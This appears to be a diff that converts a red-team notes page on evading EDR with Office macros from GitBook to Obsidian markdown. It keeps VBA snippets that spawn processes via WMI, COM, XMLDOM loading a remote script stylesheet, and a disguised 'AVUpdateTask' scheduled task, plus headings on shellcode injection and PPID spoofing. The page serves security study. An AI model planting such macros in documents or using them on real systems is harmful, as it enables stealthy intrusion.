@@ -8,31 +8,29 @@ Below are some techniques showing how those type of detections could be bypassed
 
 ## Spawning via WmiPrvse.exe using wmi
 
-{% code title="macro.vba" %}
 ```javascript
+// macro.vba
 Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
 Set objStartup = objWMIService.Get("Win32_ProcessStartup")
 Set objConfig = objStartup.SpawnInstance_
 Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
 errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
 ```
-{% endcode %}
 
-![](<../../../.gitbook/assets/Screenshot from 2019-04-10 22-11-41.png>)
+![[Screenshot from 2019-04-10 22-11-41.png]]
 
 ## Spawning via ShellCOM
 
-{% code title="macro.vba" %}
 ```csharp
+// macro.vba
 Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
 obj.Document.Application.ShellExecute "calc",Null,"C:\\Windows\\System32",Null,0
 ```
-{% endcode %}
 
 ## Spawning via svchost.exe using XMLDOM
 
-{% tabs %}
-{% tab title="xmldom.vba" %}
+
+
 ```csharp
 Set xml = CreateObject("Microsoft.XMLDOM")
 xml.async = False
@@ -40,9 +38,9 @@ Set xsl = xml
 xsl.load("file://|http://bad.xsl")
 xml.transformNode xsl
 ```
-{% endtab %}
 
-{% tab title="bad.xsl" %}
+
+
 ```markup
 <?xml version='1.0'?>
 <stylesheet
@@ -56,15 +54,15 @@ version="1.0">
 	]]> </ms:script>
 </stylesheet>
 ```
-{% endtab %}
-{% endtabs %}
 
-![](<../../../.gitbook/assets/Screenshot from 2019-04-10 23-04-07.png>)
+
+
+![[Screenshot from 2019-04-10 23-04-07.png]]
 
 ## Spawning via svchost.exe using Scheduled Task
 
-{% code title="macro.vba" %}
 ```csharp
+// macro.vba
 Set service = CreateObject("Schedule.Service")
 Call service.Connect
 Dim td: Set td = service.NewTask(0)
@@ -82,9 +80,8 @@ Action.Path = "C:\Windows\System32\cmd.exe"
 'Action.Arguments = "/c whoami"
 Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
 ```
-{% endcode %}
 
-![](<../../../.gitbook/assets/Screenshot from 2019-04-10 22-19-03.png>)
+![[Screenshot from 2019-04-10 22-19-03.png]]
 
 ## Shellcode Injection to Excel.exe Memory Using Windows APIs
 
@@ -122,9 +119,9 @@ Sub Auto_Open()
 End Sub
 ```
 
-![](<../../../.gitbook/assets/Peek 2019-04-10 22-35.gif>)
+![[Peek 2019-04-10 22-35.gif]]
 
-![TCP session from Excel.exe](<../../../.gitbook/assets/Screenshot from 2019-04-10 22-36-03.png>)
+![[Screenshot from 2019-04-10 22-36-03.png|TCP session from Excel.exe]]
 
 ## Parent Process ID Spoofing
 
@@ -443,17 +440,17 @@ Sub AutoOpen()
 End Sub
 ```
 
-![](<../../../.gitbook/assets/Screenshot from 2019-04-10 22-49-40.png>)
+![[Screenshot from 2019-04-10 22-49-40.png]]
 
 ## References
 
-{% embed url="https://www.countercept.com/blog/dechaining-macros-and-evading-edr/" %}
+[www.countercept.com/blog/dechaining-macros-and-evading-edr](https://www.countercept.com/blog/dechaining-macros-and-evading-edr/)
 
-{% embed url="https://blog.didierstevens.com/2008/10/23/excel-exercises-in-style/" %}
+[blog.didierstevens.com/2008/10/23/excel-exercises-in-style](https://blog.didierstevens.com/2008/10/23/excel-exercises-in-style/)
 
-{% embed url="https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/" %}
+[www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros](https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/)
 
-{% embed url="https://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/" %}
+[blog.didierstevens.com/2009/05/06/shellcode-2-vbscript](https://blog.didierstevens.com/2009/05/06/shellcode-2-vbscript/)
 
-{% embed url="https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/" %}
+[blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line](https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/)
 
